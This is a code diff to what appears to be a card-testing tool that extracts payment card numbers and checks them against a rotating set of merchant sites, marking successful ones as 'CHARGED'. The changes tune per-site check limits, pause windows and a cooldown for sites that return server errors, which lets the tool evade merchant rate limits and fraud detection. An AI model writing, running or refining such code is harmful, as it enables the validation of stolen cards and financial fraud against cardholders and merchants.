@@ -104,15 +104,17 @@ def extract_cards(text):
     return cards
 
 
-_bad_sites = set()   # sites that returned "Amount too small" (min > ₹100)
-_dead_sites = set()  # sites that returned "server error — site issue" (exhausted)
+_bad_sites = set()  # sites that returned "Amount too small" (min > ₹100)
 
 # A: per-site velocity cap — sites exhaust at ~10 checks ("server error"), so
-# cap each site at 3 checks per 5-min window and rotate. Tighter than the IP cap.
-MAX_CHECKS_PER_SITE = 3
-SITE_PAUSE_SECONDS = 300  # 5 min
+# cap each site at 5 checks per window and rotate. Tighter than the IP cap.
+MAX_CHECKS_PER_SITE = 5
+SITE_PAUSE_SECONDS = 60  # 1 min
+# B: a site that returns "server error" goes to cooldown for 5 min (time-based).
+SITE_DEAD_COOLDOWN_SECONDS = 300  # 5 min
 _site_uses = {}
 _site_paused_until = {}
+_site_dead_until = {}
 _site_guard = threading.Lock()
 
 
@@ -129,8 +131,10 @@ def _record_site_use(site):
 def _site_available(site):
     key = _site_key(site)
     with _site_guard:
-        if key in _bad_sites or key in _dead_sites:
+        if key in _bad_sites:
             return False
+        if time.time() < _site_dead_until.get(key, 0):
+            return False  # in "server error" cooldown (5 min)
         return time.time() >= _site_paused_until.get(key, 0)
 
 
@@ -237,7 +241,8 @@ def check_fn(card):
         if "amount too small" in m:
             _bad_sites.add(_site_key(site))
         if "server error" in m or "site issue" in m:
-            _dead_sites.add(_site_key(site))
+            with _site_guard:
+                _site_dead_until[_site_key(site)] = time.time() + SITE_DEAD_COOLDOWN_SECONDS
         
         if status == "charged":
             return "CHARGED", msg, "CHARGED"
